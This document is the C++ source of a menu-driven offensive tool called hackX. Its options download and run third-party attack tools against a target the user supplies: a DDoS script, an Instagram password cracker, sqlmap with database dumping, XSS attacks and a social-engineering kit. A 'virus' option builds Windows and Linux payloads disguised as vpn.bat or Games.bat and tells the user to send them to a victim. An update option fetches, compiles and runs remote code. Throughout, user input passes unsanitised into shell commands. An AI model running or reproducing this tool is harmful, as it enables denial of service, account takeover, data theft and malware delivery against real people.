#include <iostream>
#include <string>
#include <random>
#include <stdio.h>
#include <unistd.h>

using namespace std;

/*Install Application in Linux console*/
void InstallSystem(string Application)
{
	string Command;
	Command += "sudo apt install "+Application;
	system (Command.c_str());
	
	string Commands;
	Commands +="apt-get install "+Application;
	system (Commands.c_str());
	
	string Commandst;
	Commandst +="yum install "+Application;
	system (Commandst.c_str());
	
	string Commandstr;
	Commandstr += "pkg install "+Application;
	system (Commandstr.c_str());
	
	string Commandstrs;
	Commandstrs +="pacman -S "+Application;
	system (Commandstrs.c_str());
	
	string Commanded;
	Commanded += "pkgin install "+Application;
	system (Commanded.c_str());
	
	string Commanding;
	Commanding += "brew install "+Application;
	system (Commanding.c_str());
}

/*Upgrade system in Linux console*/
void UpgradeSystem()
{
	system("sudo apt-get upgrade");
	system("apt-get upgrade");
	system("pkg upgrade");
	system("pacman -Syyu");
	system("yum upgrade");
	system("pkgin upgrade");
	system("brew upgrade");
}

/*System code for update and install*/
void UpdateSystem()
{
	system("sudo apt-get update");
	system("apt-get update");
	system("pkg update");
	system("pacman -Sy");
	system("yum update");
	system("pkgin update");
	system("brew update");
}

int main()
{
	random_device rd;
	int n;
	
        system("clear");
        
	cout << "\033[1;35mVersion Code:\033[1;m" << rd() << endl;
	printf ("Hi welcome to hackX. \n You can hack in this application\n \033[1;36mFirst you must app in put original page or write Command (mv [NAME FILE] to ~/)\033[1;m\n \033[1;31mAttention:You must access to root , with command (su) and write your password\033[1;m \n");
	cout << " ...please wait..." << endl;
	sleep(5);
	
	system ("clear");
	cout << "\x1B[1m\x1B[31mHACK\x1B[31m \x1B[35mX" << endl;
	
	cout << "\x1B[0m| \033[1;32m1)Attack DDOS\033[1;m" << "\n| \033[1;32m2)Create the Virus\033[1;m" << "\n| \033[1;32m3)Get Proxy\033[1;m" << "\n| \033[1;32m4)Cracker Instagram\033[1;m" << "\n| \033[1;32m5)Find the Username of the Admin Website\033[1;m" << "\n| \033[1;32m6)Find IP Website\033[1;m" << "\n| \033[1;32m7)Attack SQL Injection\033[1;m" << "\n| \033[1;32m8)Website Template\033[1;m" << "\n| \033[1;32m9)Attack XSS\033[1;m" << "\n| \033[1;32m10)Create Paassword List\033[1;m" << "\n| \033[1;32m11)Checker SSL Websites\033[1;m" << "\n| \033[1;32m12)Social Engineering\033[1;m";
	cout << "\n\n| \033[1;34m50)Debug\033[1;m" << "\n| \033[1;34m51)Change Password Router\033[1;m" << "\n| \033[1;34m52)Go to DarkWeb\033[1;m" << "\n| \033[1;34m53)View Source\033[1;m"<< "\n| \033[1;34m54)Test Internet Speed\033[1;m";
	
	cout << string(2 , '\n'); 
	cout << "\033[1;36m99)About______________________________100)Update\033[1;m" << endl;
	cout << "\n \nPlease Enter Number:";
	cin >> n;
	if (1 == n)
	{
		string s;
		string str;
		string spam;
		string num;
		InstallSystem("python3");
		InstallSystem("git");
 		system ("git clone https://github.com/cyweb/hammer");
 		#ifndef __linux__
 		system ("git clone git://github.com/cyweb/hammer.git");
 		#endif
		system ("mv hammer/hammer.py ../hackX");
		system ("mv hammer/headers.txt ../hackX");
		system ("mv hammer/README.md ../hackX");
		
		system("clear");
		
		cout << "Please Enter IP Number:";
 		cin >> s;	
		cout << "Please Enter Port Number:";
		cin >> spam;
		cout << "Please Enter thread Number:";
		cin >> num;
		str="python hammer.py -s "+s+" -p "+spam+" -t "+num;
		str="python3 hammer.py -s "+s+" -p "+spam+" -t "+num;
		


		const char * commands = str.c_str();
		system (commands);
		
		system ("rm -rf headers.txt");
		system ("rm -rf hammer.py");
		system ("rm -rf README.md");
		system ("rm -rf hammer");
		printf ("\033[1;32m((((([[[[[[Success In Load]]]]])))))\033[1;m\n \a");
		cout << __TIME__ << endl;
		cout << "Bye";
		}
	else if (2 == n)
	{
		int sp;
		system("clear");
		
		cout << "which one you choosing?";
		cout << "\n \033[1;32m1) Virus For Windows\033[1;m" << "\n \033[1;32m2) Virus For Linux\033[1;m";
		cout << string(10 , '\n'); 

		cout << "Please Enter Number:";
		cin >> sp;
		
		if (sp == 1)
		{
			InstallSystem ("g++");
			InstallSystem ("clang++");
			InstallSystem ("clang");
			
			int vus;
			
			system ("clear");
			cout << "which one virus?" << "\n\033[1;32m 1)virus for windows OS\033[1;m" << "\n\033[1;32m 2)virus for Hard full\033[1;m" << "\n\033[1;32m 3)virus for CD Rom\033[1;m" << "\n\033[1;32m 4)virus for error\033[1;m" << "\n\033[1;32m 5)virus for message \033[1;m";
			cout << string(10 , '\n'); 

			cout << "Please Enter Number:";
			cin >> vus;
			
			if (1 == vus)
			{
				system ("cp Data/virusWindows.cpp ../hackX");
				system ("c++ virusWindows.cpp");	
				system ("./a.out");
				
				system ("mkdir Output");

				system ("mv hi.txt Output/vpn.bat");
				system ("rm -rf virusWindows.cpp");
			
				system ("c++ hackx.cpp");
				system ("mv a.out hackx.run");
				cout << "  \033[1;32mCreated virus for Windows\033[1;m";
				printf ("\n \033[1;36mHelp: File Name is vpn.bat and Must you send virus a device \033[1;m");
				printf ("\n \033[1;31mAttention: Must be device Windows and must disable firewall\033[1;m");
				printf ("\n\033[1;32m((((([[[[[[Success In Load]]]]])))))\033[1;m\n \a");
				cout << __TIME__ << endl;
				cout << "Bye";
			}
			
			else if (2 == vus)
			{
				system ("cp Data/virusHard.cpp ../hackX");
				system ("c++ virusHard.cpp");
				system ("./a.out");
				system ("mkdir Output"); 
				system ("mv hi.txt Output/Games.bat");
				system ("rm -rf virusHard.cpp");
				system ("c++ hackx.cpp");
				system ("mv a.out hackx.run");
				cout << "  \033[1;32mCreated virus for Windows\033[1;m";
				printf ("\n \033[1;36mHelp: File Name Games.bat and Must you send virus a device\033[1;m");
				printf ("\n \033[1;31mAttention: Must be device Windows and must disable firewall\033[1;m");
				printf ("\n \033[1;32m((((([[[[[[Success In Load]]]]])))))\033[1;m\n \a");
				cout << __TIME__ << "\n";
				cout << "Bye";
			}
			else if (3 == vus)
			{
				system ("cp Data/virusCD.vbs ../hackX");
				system ("mkdir Output");
				system ("mv virusCD.vbs Output/debugCD.vbs");
				system ("c++ hackx.cpp");
				system ("mv a.out hackx.run");
				cout << "  \033[1;32mCreated virus for CD Rom\033[1;m";
				printf ("\n \033[1;36mHelp: File Name debugCD.vbs and Must you send virus a device\033[1;m");
				printf ("\n \033[1;31mAttention: Must be device Windows and must disable firewall\033[1;m");
				printf ("\n\033[1;32m((((([[[[[[Success In Load]]]]])))))\033[1;m\n \a");
				cout << __TIME__ << endl;
				cout << "Bye";
			}
			else if (4 == vus)
			{
				system ("cp Data/virusError.vbs ../hackX");
				system ("mkdir Output");
				system ("mv virusError.vbs Output/Messager.vbs");
				system ("c++ hackx.cpp");
				system ("mv a.out hackx.run");
				cout << "  \033[1;32mCreated virus for Messager\033[1;m";
				printf ("\n \033[1;36mHelp: File Name Messager.vbs and Must you send virus a device\033[1;m");
				printf ("\n \033[1;31mAttention: Must be device Windows and must disable firewall\033[1;m");
				printf ("\n\033[1;32m((((([[[[[[Success In Load]]]]])))))\033[1;m\n \a");
				cout << __TIME__ << endl;
				cout << "Bye";
			}
			else if (5 == vus)
			{
				system ("cp Data/virusVoice.vbs ../hackX/");
				system ("mkdir Output");
				system ("mv virusVoice.vbs Output/Voice.vbs");
				system ("c++ hackx.cpp");
				system ("mv a.out hackx.run");
				cout << "  \033[1;32mCreated virus for Voice\033[1;m";
				printf ("\n \033[1;36mHelp: File Name Messager.vbs and Must you send virus a device\033[1;m");
				printf ("\n \033[1;31mAttention: Must be device Windows and must disable firewall\033[1;m");
				printf ("\n\033[1;32m((((([[[[[[Success In Load]]]]])))))\033[1;m\n \a");
				cout << __TIME__ << endl;
				cout << "Bye";
			}
		}
		else if (sp == 2)
		{
			InstallSystem("git");
			InstallSystem("clang++");
			InstallSystem("clang");
			InstallSystem("g++");
			int vus;
			system ("cp Data/virusLinux.cpp ../hackX");
			system ("c++ virusLinux.cpp");
			system ("mkdir Output");
			system ("mv a.out Output/vpn.run");
			system ("rm -rf virusLinux.cpp");
			system ("c++ hackx.cpp");
			system ("mv a.out hackx.run");
			cout << "  \033[1;32mcreated virus for Linux\033[1;m";
			printf ("\n \033[1;36mhelp: File Name is vpn.run and Must you send virus a device\033[1;m");
			printf ("\n \033[1;31mAttention: must be device Linux\033[1;m");
			printf ("\n\033[1;32m((((([[[[[[Success In Load]]]]])))))\033[1;m\n \a");
			cout <<  __TIME__ << endl;
			cout <<  "Bye";
		}
		else
		{
			printf ("\033[1;31m((((([[[[[[Unsuccess In Load]]]]])))))\033[1;m\n \a");
			cout <<  __TIME__ << endl;
			cout <<  "Bye";
		}
	}
	else if (3 == n)
	{
		InstallSystem("git");
		InstallSystem("python");
		system ("git clone https://github.com/stamparm/fetch-some-proxies");
		#ifndef __linux__
		system ("git clone git://github.com/stamparm/fetch-some-proxies.git");
		#endif
		system ("mv fetch-some-proxies/fetch.py ../hackX/");
		system ("clear");
		system ("python2 fetch.py --threads=300");
		system ("rm -rf fetch-some-proxies");
		system ("rm -rf fetch.py");
		sleep(1);
		printf ("\033[1;32m((((([[[[[[Success In Load]]]]])))))\033[1;m\n \a");
		cout <<  __TIME__ << endl;
		cout <<  "Bye";
		}
	else if (4 == n)
	{
		InstallSystem("git");
		InstallSystem("tor");
		system ("git clone https://github.com/maxrooted/instashell");
		#ifndef __linux__
		system ("git clone git://github.com/maxrooted/instashell.git");
		#endif
		system ("mv instashell/instashell.sh ../hackX/");
		system ("mv instashell/install.sh ../hackX/");
		system ("mv instashell/passwords.lst ../hackX");
		system ("chmod +x install.sh");
		system ("./install.sh");
		system ("chmod +x instashell.sh");
		system ("systemctl start tor");
		system ("service tor start");
		system ("./instashell.sh");
		system ("rm -rf instashell");
		system ("rm -rf nottested.lst");
		system ("rm -rf install.sh");
		system ("rm -rf instashell.sh");
		system ("rm -rf passwords.lst");
		printf ("\033[1;32m((((([[[[[[Success In Load]]]]])))))\033[1;m\n \a");
		cout <<  __TIME__ << endl;
		cout <<  "Bye";
	}
	else if (5 == n)
	{
		string s2;
		string str2;
		InstallSystem("git");
		InstallSystem("python-pip");
		InstallSystem("python2-pip");
		system ("git clone https://github.com/s0md3v/Breacher");
		#ifndef __linux__
		system ("git clone git://github.com/s0md3v/Breacher.git");
		#endif
		system ("mv Breacher/breacher.py ../hackX");
		system ("mv Breacher/paths.txt ../hackX");
		system ("mv Breacher/LICENSE ../hackX");
		system ("pip2 install requests threading argparse");
		system ("pip install requests threading argparse");
		system ("clear");
		cout <<  "Website Address:";
		cin >> s2;	
		str2="python2 breacher.py -u "+s2;
		
		const char * commands = str2.c_str();
			
		system (commands); 
		system ("rm -rf Breacher");
		system ("rm -rf breacher.py");
		system ("rm -rf paths.txt");
		system ("rm -rf LICENSE");
		printf ("\033[1;32m((((([[[[[[Success In Load]]]]])))))\033[1;m\n \a");
		cout <<  __TIME__ << endl;
		cout <<  "Bye";
		}
	else if (6 == n)
	{
		string s3;
		string str3;
		
		UpdateSystem();
		InstallSystem("nmap");
		system ("clear");
		cout <<  "please Enter Website (Without http://):";
		cin >> s3;	
		str3="nmap -v -A "+s3;
		
		const char *commands = str3.c_str();
			
		system (commands); 
		printf ("\033[1;32m((((([[[[[[Success In Load]]]]])))))\033[1;m\n \a");
		cout <<  __TIME__ << endl;
		cout <<  "Bye";
	}
	else if (7 == n)
	{
		string s4;
		string str4;
		InstallSystem("git");
		InstallSystem("python");
		InstallSystem("python2");
		system ("git clone --depth 1 https://github.com/sqlmapproject/sqlmap sqlmap-dev");
		#ifndef __linux__
		system ("git clone --depth 1 git://github.com/sqlmapproject/sqlmap.git sqlmap-dev");
		#endif
		system ("mv sqlmap-dev/COMMITMENT ../hackX");
		system ("mv sqlmap-dev/doc ../hackX");
		system ("mv sqlmap-dev/lib ../hackX");
		system ("mv sqlmap-dev/plugins ../hackX/");
		system ("mv sqlmap-dev/sqlmapapi.py ../hackX/");
		system ("mv sqlmap-dev/sqlmap.py ../hackX/");
		system ("mv sqlmap-dev/thirdparty ../hackX/");
		system ("mv sqlmap-dev/data ../hackX/");
		system ("mv sqlmap-dev/extra ../hackX/");
		system ("mv sqlmap-dev/LICENSE ../hackX/");
		system ("mv sqlmap-dev/README.md ../hackX/");
		system ("mv sqlmap-dev/sqlmap.conf ../hackX/");
		system ("mv sqlmap-dev/tamper ../hackX/");
		system ("clear");
		cout <<  "Please Enter the Website That Has the Bug(Without http://):";
		cin >> s4;	
		str4="python2 sqlmap.py -u http://"+s4+" --dump";
		
		const char * commands = str4.c_str();
			
		system (commands);
		system ("rm -rf sqlmap-dev");
		system ("rm -rf COMMITMENT");
		system ("rm -rf doc");
		system ("rm -rf lib");
		system ("rm -rf plugins");
		system ("rm -rf sqlmapapi.py");
		system ("rm -rf sqlmap.py");
		system ("rm -rf thirdparty");
		system ("rm -rf data");
		system ("rm -rf extra");
		system ("rm -rf LICENSE");
		system ("rm -rf README.md");
		system ("rm -rf sqlmap.conf");
		system ("rm -rf tamper");
		printf ("\033[1;32m((((([[[[[[Success In Load]]]]])))))\033[1;m\n \a");
		cout <<  __TIME__ << endl;
		cout <<  "Bye";
	}  
	else if (8 == n)
	{
		string str5;
		string s5;
		InstallSystem("httrack");
		system ("mkdir templateWeb");
		system ("clear");
		cout <<  "please Enter Website for Receive Template:";
		cin >> s5;
		
		str5="httrack "+s5+" +* -r6 -O templateWeb";

		const char * commands = str5.c_str();
		system (commands);
		printf ("\033[1;33m Received In File templateWeb\033[1;m \n");
		printf ("\033[1;32m((((([[[[[[Success In Load]]]]])))))\033[1;m\n \a");
		cout <<  __TIME__ << endl;
		cout <<  "Bye";		 
	}
	else if (9 == n)
	{
		string str6,strs6;
		string s6;
		InstallSystem("git");
		InstallSystem("python");
		InstallSystem("python2");
		InstallSystem("python3");
		InstallSystem("python-pip");
		system ("git clone https://github.com/epsylon/xsser");
		#ifndef __linux__
		system ("git clone git://github.com/epsylon/xsser.git");
		#endif
		InstallSystem("python-pycurl");
		InstallSystem("python3-pycurl");
		InstallSystem("python-xmlbuilder");
		InstallSystem("python3-xmlbuilder");
		InstallSystem("python-beautifulsoup");
		InstallSystem("python3-beautifulsoup");
		InstallSystem("python-geoip");
		InstallSystem("python3-geoip");
		system ("pip install pycurl bs4 pygeoip gobject cairocffi selenium");
		system ("pip3 install pycurl bs4 pygeoip gobject cairocffi selenium");
		system ("mv xsser/setup.py ../hackX");
		system ("mv xsser/xsser ../hackX/hackXSS");
		system ("mv xsser/Makefile ../hackX");
		system ("mv xsser/gtk ../hackX");
		system ("mv xsser/doc ../hackX");
		system ("mv xsser/core ../hackX");
		system ("python setup.py install");
		system ("python3 setup.py install");
		
		system ("clear");
		cout <<  "Please Enter Website for Attack:";
		cin >> s6;
		
		strs6="python3 hackXSS --all --url "+s6+" -c 99999 --Cw 1 --Cl -s --user-agent --follow-limit 50 --threads 10 --timeout 60 --retries 2 --delay 5 --auto --Coo --Xsa --Xsr --Dcp --Ind --Doss --Onm --Ifr --silent";

		str6="python hackXSS --all --url "+s6+" -c 99999 --Cw 1 --Cl -s --user-agent --follow-limit 50 --threads 10 --timeout 60 --retries 2 --delay 5 --auto --Coo --Xsa --Xsr --Dcp --Ind --Doss --Onm --Ifr --silent";
		

		const char * commands2 = strs6.c_str();
		system (commands2);

		const char *commands = str6.c_str();
		system (commands);
		
		system ("rm -rf xsser.egg-info");
		system ("rm -rf build");
		system ("rm -rf doc");
		system ("rm -rf gtk");
		system ("rm -rf core");
		system ("rm -rf setup.py");
		system ("rm -rf Makefile");
		system ("rm -rf hackXSS");
		system ("rm -rf xsser");
		printf ("\033[1;32m((((([[[[[[Success In Load]]]]])))))\033[1;m\n \a");
		cout <<  __TIME__ << endl;
		cout <<  "Bye";
	}
	else if (10 == n)
	{
		InstallSystem("python3");
		InstallSystem("python");
		InstallSystem("python2");
		InstallSystem("git");
		system ("git clone https://github.com/Mebus/cupp");
		#ifndef __linux__
		system ("git clone git://github.com/Mebus/cupp.git");
		#endif
		system ("mv cupp/CHANGELOG.md ../hackX");
		system ("mv cupp/cupp.cfg ../hackX");
		system ("mv cupp/cupp.py ../hackX");
		system ("mv cupp/LICENSE ../hackX");
		system ("mv cupp/README.md ../hackX");
		system ("mv cupp/test_cupp.py ../hackX");
		system ("clear");
		system ("./cupp.py -i");
		system ("rm -rf cupp");
		system ("rm -rf CHANGELOG.md");
		system ("rm -rf cupp.cfg");
		system ("rm -rf cupp.py");
		system ("rm -rf LICENSE");
		system ("rm -rf README.md");
		system ("rm -rf test_cupp.py");
		printf ("\033[1;32m((((([[[[[[Success In Load]]]]])))))\033[1;m\n \a");
		cout <<  __TIME__ << endl;
		cout <<  "Bye";
	}
	else if (11 == n)
	{
		string str8;
		string s8;
		InstallSystem("git");
		InstallSystem("python");
		InstallSystem("python2");
		InstallSystem("python3");
		InstallSystem("python-pip");
		InstallSystem("python3-pip");
		system ("git clone https://github.com/narbehaj/ssl-checker");
		#ifndef __linux__
		system ("git clone git://github.com/narbehaj/ssl-checker.git");
		#endif
		system ("mv ssl-checker/LICENSE ../hackX/");
		system ("mv ssl-checker/README.md ../hackX/");
		system ("mv ssl-checker/requirements.txt ../hackX/");
		system ("mv ssl-checker/socks.py ../hackX/");
		system ("mv ssl-checker/socks.pyc ../hackX/");
		system ("mv ssl-checker/ssl_checker.py ../hackX/");
		system ("pip install -r requirements.txt");
		system ("pip3 install -r requirements.txt");
		system ("clear");
		cout <<  "Enter Website for Check SSL:";
		cin >> s8;
		
		str8="./ssl_checker.py -H "+s8;

		const char *commands = str8.c_str();
		system (commands);
		system ("rm -rf LICENSE");
		system ("rm -rf README.md");
		system ("rm -rf requirements.txt");
		system ("rm -rf socks.py");
		system ("rm -rf ssl_checker.py");
		system ("rm -rf ssl-checker");
		printf ("\033[1;32m((((([[[[[[Success In Load]]]]])))))\033[1;m\n \a");
		cout <<  __TIME__ << endl;
		cout <<  "Bye";
	}
	else if (12 == n)
	{
		InstallSystem("python");
		InstallSystem("python3");
		InstallSystem("git");
		system ("git clone https://github.com/trustedsec/social-engineer-toolkit");
		#ifndef __linux__
		system ("git clone git://github.com/trustedsec/social-engineer-toolkit.git");
		#endif
		system ("mv social-engineer-toolkit/.gitignore ../hackX");
		system ("mv social-engineer-toolkit/Dockerfile ../hackX");
		system ("mv social-engineer-toolkit/README.md ../hackX");
		system ("mv social-engineer-toolkit/requirements.txt ../hackX");
		system ("mv social-engineer-toolkit/seautomate ../hackX");
		system ("mv social-engineer-toolkit/seproxy ../hackX");
		system ("mv social-engineer-toolkit/setoolkit ../hackX");
		system ("mv social-engineer-toolkit/setup.py ../hackX");
		system ("mv social-engineer-toolkit/seupdate ../hackX");
		system ("mv social-engineer-toolkit/.github ../hackX");
		system ("mv social-engineer-toolkit/modules ../hackX");
		system ("mv social-engineer-toolkit/readme ../hackX");
		system ("mv social-engineer-toolkit/src ../hackX");
		system ("pip3 install -r requirements.txt");
		system ("pip install -r requirements.txt");
		system ("python3 setup.py");
		system ("python setup.py");
		system ("./setoolkit");
		system ("rm -rf .github");
		system ("rm -rf modules");
		system ("rm -rf readme");
		system ("rm -rf src");
		system ("rm -rf .gitignore");
		system ("rm -rf Dockerfile");
		system ("rm -rf README.md");
		system ("rm -rf requirements.txt");
		system ("rm -rf seautomate");
		system ("rm -rf seproxy");
		system ("rm -rf setoolkit");
		system ("rm -rf setup.py");
		system ("rm -rf seupdate");
		system ("rm -rf social-engineer-toolkit");
		printf ("\033[1;32m((((([[[[[[Success In Load]]]]])))))\033[1;m\n \a");
		cout <<  __TIME__ << endl;
		cout <<  "Bye";
	}
	else if (50 == n)
	{
		system ("rm -rf /var/cache/apt/archives/lock");
		system ("rm -rf /var/lib/pacman/db.lck");
		system ("clear");
		printf ("Debug Successful\n \a");
		cout <<  __TIME__ << endl;
		cout <<  "Bye";
	}
	else if (51 == n)
	{
		printf ("Other 5 Seconds To Web Browser\n");
		sleep(5);	
		system ("clear");	
		system ("xdg-open http://192.168.1.1");
		
		printf ("HELP: Enter the Word \033[1;32m(admin)\033[1;m In Username And Password\n");
		printf ("2 Steps \033[1;32m(wireless setup)\033[1;m To Click\n");
		printf ("3 Steps \033[1;32m(wireless security)\033[1;m To Click\n"); 
		printf ("\033[1;32m((((([[[[[[Success In Load]]]]])))))\033[1;m\n \a");
		cout <<  __TIME__ << endl;
		cout <<  "Bye";
	}
	else if ( 52 == n)
	{
		system ("wget https://github.com/TheTorProject/gettorbrowser/releases/download/v8.0.2/tor-browser-linux64-8.0.2_en-US.tar.xz");
		system ("tar -xf tor-browser-linux64-8.0.2_en-US.tar.xz");
		system ("mv ~/hackX/tor-browser_en-US/Browser/abicheck ~/hackX/");
		system ("mv ~/hackX/tor-browser_en-US/Browser/application.ini ~/hackX/");
		system ("mv ~/hackX/tor-browser_en-US/Browser/browser ~/hackX/");
		system ("mv ~/hackX/tor-browser_en-US/Browser/chrome.manifest ~/hackX/");
		system ("mv ~/hackX/tor-browser_en-US/Browser/defaults ~/hackX/");
		system ("mv ~/hackX/tor-browser_en-US/Browser/dependentlibs.list ~/hackX/");
		system ("mv ~/hackX/tor-browser_en-US/Browser/dictionaries ~/hackX/");
		system ("mv ~/hackX/tor-browser_en-US/Browser/execdesktop ~/hackX/");
		system ("mv ~/hackX/tor-browser_en-US/Browser/firefox ~/hackX/");
		system ("mv ~/hackX/tor-browser_en-US/Browser/firefox.real ~/hackX/");
		system ("mv ~/hackX/tor-browser_en-US/Browser/fonts ~/hackX/");
		system ("mv ~/hackX/tor-browser_en-US/Browser/gtk2 ~/hackX/");
		system ("mv ~/hackX/tor-browser_en-US/Browser/icons ~/hackX/");
		system ("mv ~/hackX/tor-browser_en-US/Browser/libfreeblpriv3.so ~/hackX/");
		system ("mv ~/hackX/tor-browser_en-US/Browser/liblgpllibs.so ~/hackX/");
		system ("mv ~/hackX/tor-browser_en-US/Browser/libmozavcodec.so ~/hackX/");
		system ("mv ~/hackX/tor-browser_en-US/Browser/libmozavutil.so ~/hackX/");
		system ("mv ~/hackX/tor-browser_en-US/Browser/libmozgtk.so ~/hackX/");
		system ("mv ~/hackX/tor-browser_en-US/Browser/libmozsandbox.so ~/hackX/");
		system ("mv ~/hackX/tor-browser_en-US/Browser/libmozsqlite3.so ~/hackX/");
		system ("mv ~/hackX/tor-browser_en-US/Browser/libnspr4.so ~/hackX/");
		system ("mv ~/hackX/tor-browser_en-US/Browser/libnss3.so ~/hackX/");
		system ("mv ~/hackX/tor-browser_en-US/Browser/libnssckbi.so ~/hackX/");
		system ("mv ~/hackX/tor-browser_en-US/Browser/libnssdbm3.so ~/hackX/");
		system ("mv ~/hackX/tor-browser_en-US/Browser/libnssutil3.so ~/hackX/");
		system ("mv ~/hackX/tor-browser_en-US/Browser/libplc4.so ~/hackX/");
		system ("mv ~/hackX/tor-browser_en-US/Browser/libplds4.so ~/hackX/");
		system ("mv ~/hackX/tor-browser_en-US/Browser/libsmime3.so ~/hackX/");
		system ("mv ~/hackX/tor-browser_en-US/Browser/libsoftokn3.so ~/hackX/");	
		system ("mv ~/hackX/tor-browser_en-US/Browser/libssl3.so ~/hackX/");
		system ("mv ~/hackX/tor-browser_en-US/Browser/libxul.so ~/hackX/");
		system ("mv ~/hackX/tor-browser_en-US/Browser/omni.ja ~/hackX/");
		system ("mv ~/hackX/tor-browser_en-US/Browser/pingsender ~/hackX/");
		system ("mv ~/hackX/tor-browser_en-US/Browser/platform.ini ~/hackX/");
		system ("mv ~/hackX/tor-browser_en-US/Browser/plugin-container ~/hackX/");
		system ("mv ~/hackX/tor-browser_en-US/Browser/precomplete ~/hackX/");
		system ("mv ~/hackX/tor-browser_en-US/Browser/removed-files ~/hackX/");
		system ("mv ~/hackX/tor-browser_en-US/Browser/start-tor-browser ~/hackX/");
		system ("mv ~/hackX/tor-browser_en-US/Browser/start-tor-browser.desktop ~/hackX/");
		system ("mv ~/hackX/tor-browser_en-US/Browser/tbb_version.json ~/hackX/");
		system ("mv ~/hackX/tor-browser_en-US/Browser/TorBrowser ~/hackX/");
		system ("mv ~/hackX/tor-browser_en-US/Browser/updater ~/hackX/");
		system ("mv ~/hackX/tor-browser_en-US/Browser/updater.ini ~/hackX/");
		system ("mv ~/hackX/tor-browser_en-US/Browser/update-settings.ini ~/hackX/");
		system ("clear");
		cout <<  "Go to Web Browser\n";
		system ("xdg-open http://5u56fjmxu63xcmbk.onion");
		system ("rm -rf libplc4.so");
		system ("rm -rf tor-browser_en-US");
		system ("rm -rf tor-browser-linux64-8.0.2_en-US.tar.xz");
		system ("rm -rf update-settings.ini");
		system ("rm -rf updater.ini");
		system ("rm -rf updater");
		system ("rm -rf TorBrowser");
		system ("rm -rf tbb_version.json");
		system ("rm -rf start-tor-browser.desktop");	
		system ("rm -rf start-tor-browser");
		system ("rm -rf removed-files");
		system ("rm -rf precomplete");
		system ("rm -rf plugin-container");
		system ("rm -rf platform.ini");
		system ("rm -rf pingsender");
		system ("rm -rf omni.ja");
		system ("rm -rf libxul.so");
		system ("rm -rf libssl3.so");
		system ("rm -rf libsoftokn3.so");
		system ("rm -rf libsmime3.so");
		system ("rm -rf libplds4.so");
		system ("rm -rf libnssutil3.so");
		system ("rm -rf libnssdbm3.so");
		system ("rm -rf libnssckbi.so");
		system ("rm -rf libnss3.so");
		system ("rm -rf libnspr4.so");
		system ("rm -rf libmozsqlite3.so");
		system ("rm -rf libmozsandbox.so");
		system ("rm -rf libmozgtk.so");
		system ("rm -rf libmozavutil.so");
		system ("rm -rf libmozavcodec.so");
		system ("rm -rf liblgpllibs.so");
		system ("rm -rf libfreeblpriv3.so");
		system ("rm -rf icons");
		system ("rm -rf gtk2");
		system ("rm -rf fonts");
		system ("rm -rf firefox.real");
		system ("rm -rf firefox");
		system ("rm -rf execdesktop");
		system ("rm -rf dictionaries");
		system ("rm -rf dependentlibs.list");
		system ("rm -rf defaults");
		system ("rm -rf chrome.manifest");
		system ("rm -rf browser");
		system ("rm -rf application.ini");
		system ("rm -rf abicheck");
		printf ("\033[1;32m((((([[[[[[Success In Load]]]]])))))\033[1;m\n \a");
		cout <<  __TIME__ << endl;
		cout <<  "Bye";
	}
	else if ( 53 == n)
	{
		InstallSystem("curl");
		string str7;
		string s7;
		system ("exit");
		system ("exit");
		system ("clear");
		cout <<  "Please Enter Website:";
		cin >> s7;
		
		str7="curl "+s7+" > source.html";
		
		const char *commands = str7.c_str();
		system (commands);
		
		system ("clear");
		string str8;
		str8="curl "+s7;
		const char *commands2 = str8.c_str();
		system (commands2);
		
		printf ("\033[1;32m((((([[[[[[Success In Load]]]]])))))\033[1;m\n \a");
		cout <<  __TIME__ << endl;
		cout <<  "Bye";
	}
	else if ( 54 == n)
	{
		string str9;
		string s9;
		system ("clear");
		cout <<  "Which Website Should Check for Internet Speed?";
		cin >> s9;
		str9="ping "+s9;
		const char *commands = str9.c_str();
		system (commands);
		printf ("\033[1;32m((((([[[[[[Success In Load]]]]])))))\033[1;m\n \a");
		cout <<  __TIME__ << endl;
		cout <<  "Bye";
	}
	else if ( 99 == n)
	{
		system ("clear");
		cout <<  string(6 , '\n');
		cout <<  "                   Designer:Cunknown" << endl;
		cout <<  "                  Programmer:Cunknown" << endl;
		printf ("\033[1;32m((((([[[[[[Success In Load]]]]])))))\033[1;m\n \a");
		cout <<  __TIME__ << endl;
		cout <<  "Bye";
		system ("rm -rf hackX");
	}
	else if ( 100 == n)
	{
		system ("git clone https://github.com/anonymous14725/hackX");
		#ifndef __linux__
		system ("git clone git://github.com/anonymous14725/hackX.git");
		#endif
		system ("mv hackX/hackx.run ../hackX");
		system ("mv hackX/hackx.cpp ../hackX");
		system ("rm -rf Data");
		system ("mv hackX/Data ../hackX");
		system ("chmod +x hackx.run");
		system ("rm -rf hackX");
		system ("c++ hackx.cpp");
		system ("./a.out");
	}
	else
	{
		printf ("\033[1;31m((((([[[[[[Unsuccess In Load]]]]])))))\033[1;m\n \a");
		cout <<  __TIME__ << endl;
		cout <<  "Bye";
	}

 return 0;
}
